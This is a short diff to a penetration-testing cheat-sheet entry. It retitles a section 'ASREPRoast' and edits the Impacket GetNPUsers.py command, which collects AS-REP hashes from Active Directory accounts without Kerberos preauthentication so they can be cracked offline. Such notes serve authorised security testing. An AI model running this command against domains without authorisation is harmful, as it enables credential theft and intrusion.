@@ -1,7 +1,7 @@
 # getnpusers
 #plateform/linux #target/remote #cat/ATTACK
 
-## Get TGTs for no preauth users
+## ASREPRoast
 ```
-GetNPUsers.py -usersfile <usersfile|users.txt> -outputfile hashes.asreproast <domain>/
+GetNPUsers.py -usersfile <users_file|users.txt> -outputfile hashes.asreproast <domain>/
 ```
